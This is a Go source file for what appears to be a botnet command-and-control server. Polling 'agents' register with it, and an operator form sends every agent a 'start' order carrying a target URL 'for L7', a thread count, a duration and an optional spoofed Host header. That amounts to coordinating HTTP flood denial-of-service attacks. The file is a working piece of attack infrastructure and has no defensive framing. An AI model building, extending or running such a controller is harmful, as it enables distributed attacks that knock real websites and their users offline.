package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"strconv"
	"sync"
	"time"
)

// Command and AgentStatus stay exactly as before:
type Command struct {
	Action     string `json:"action"`      // "start" or "stop" or "none"
	URL        string `json:"url"`         // Target URL for L7
	Threads    int    `json:"threads"`     // # of threads
	Timer      int    `json:"timer"`       // duration in seconds
	CustomHost string `json:"custom_host"` // optional Host header
}

type AgentStatus struct {
	Online   bool   `json:"Online"`
	Status   string `json:"Status"`
	LastPing string `json:"LastPing"` // RFC3339 timestamp
}

var (
	mu               sync.Mutex
	registeredAgents = make(map[string]bool)
	pendingCommands  = make(map[string]Command)
	agentStatuses    = make(map[string]*AgentStatus)
)

// How long since LastPing before we consider the agent "offline".
// (Choose a value somewhat larger than the agent’s polling interval.)
const offlineTimeout = 10 * time.Second

func renderInterface(w http.ResponseWriter, r *http.Request) {
	const filePath = "Interface/index.html"
	tmpl, err := template.ParseFiles(filePath)
	if err != nil {
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		fmt.Printf("[CONTROL] Template error: %v\n", err)
		return
	}
	tmpl.Execute(w, nil)
}

func handleCommand(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	url := r.FormValue("url")
	threads, _ := strconv.Atoi(r.FormValue("threads"))
	timer, _ := strconv.Atoi(r.FormValue("timer"))
	customHost := r.FormValue("custom_host")

	cmd := Command{
		Action:     "start",
		URL:        url,
		Threads:    threads,
		Timer:      timer,
		CustomHost: customHost,
	}

	mu.Lock()
	for agentID := range registeredAgents {
		pendingCommands[agentID] = cmd
		fmt.Printf("[CONTROL] Enqueued START for %s → %+v\n", agentID, cmd)
	}
	mu.Unlock()

	http.Redirect(w, r, "/", http.StatusSeeOther)
}

func agentPollHandler(w http.ResponseWriter, r *http.Request) {
	agentID := r.URL.Query().Get("agentID")
	if agentID == "" {
		http.Error(w, "agentID required", http.StatusBadRequest)
		return
	}

	now := time.Now().Format(time.RFC3339)

	mu.Lock()
	// Mark agent as registered and online
	registeredAgents[agentID] = true
	if _, exists := agentStatuses[agentID]; !exists {
		agentStatuses[agentID] = &AgentStatus{
			Online:   true,
			Status:   "Ready",
			LastPing: now,
		}
	} else {
		agentStatuses[agentID].Online = true
		agentStatuses[agentID].LastPing = now
	}

	// If there is a pending command, pop it and return it
	if cmd, exists := pendingCommands[agentID]; exists {
		delete(pendingCommands, agentID)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(cmd)
		mu.Unlock()
		return
	}
	mu.Unlock()

	// No pending command → send {"action":"none"}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(Command{Action: "none"})
}

func agentStatusHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid method", http.StatusMethodNotAllowed)
		return
	}

	var payload struct {
		AgentID string `json:"agentID"`
		Status  string `json:"status"`
	}
	if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	now := time.Now().Format(time.RFC3339)

	mu.Lock()
	if entry, exists := agentStatuses[payload.AgentID]; exists {
		entry.Status = payload.Status
		entry.LastPing = now
		entry.Online = true
	} else {
		agentStatuses[payload.AgentID] = &AgentStatus{
			Online:   true,
			Status:   payload.Status,
			LastPing: now,
		}
		registeredAgents[payload.AgentID] = true
	}
	fmt.Printf("[CONTROL] Updated status of %s → %s at %s\n",
		payload.AgentID,
		payload.Status,
		agentStatuses[payload.AgentID].LastPing,
	)
	mu.Unlock()

	w.WriteHeader(http.StatusOK)
}

func listAgentStatuses(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	// Build a copy so we can marshal safely.
	out := make(map[string]AgentStatus, len(agentStatuses))
	for id, ptr := range agentStatuses {
		copyEntry := *ptr
		// If the agent is currently marked offline, wipe out its Status string:
		if copyEntry.Online == false {
			copyEntry.Status = ""
		}
		out[id] = copyEntry
	}
	mu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

// ----------------------
// NEW FUNCTION BELOW
// ----------------------

// watchForOfflineAgents periodically checks LastPing on each agent.
// If it’s older than offlineTimeout, it sets Online=false.
func watchForOfflineAgents() {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		cutoff := time.Now().Add(-offlineTimeout)
		mu.Lock()
		for agentID, statusPtr := range agentStatuses {
			// Parse the LastPing timestamp
			last, err := time.Parse(time.RFC3339, statusPtr.LastPing)
			if err != nil {
				// If parsing fails for some reason, treat as offline
				statusPtr.Online = false
				continue
			}
			if last.Before(cutoff) {
				if statusPtr.Online {
					fmt.Printf("[CONTROL] Marking agent %s as OFFLINE (last ping: %s)\n", agentID, statusPtr.LastPing)
				}
				statusPtr.Online = false
			}
			// If last ≥ cutoff, leave Online as-is (presumably it’s already true)
		}
		mu.Unlock()
	}
}

func main() {
	// Serve static files from "Interface"
	fs := http.FileServer(http.Dir("Interface"))
	http.Handle("/Interface/", http.StripPrefix("/Interface/", fs))

	http.HandleFunc("/", renderInterface)
	http.HandleFunc("/command", handleCommand)
	http.HandleFunc("/poll-agent", agentPollHandler)
	http.HandleFunc("/agent-status", agentStatusHandler)
	http.HandleFunc("/agent-statuses", listAgentStatuses)

	// Start the background goroutine that will mark stale agents as offline:
	go watchForOfflineAgents()

	fmt.Println("[CONTROL] Listening at http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		fmt.Printf("[CONTROL] ListenAndServe error: %v\n", err)
	}
}
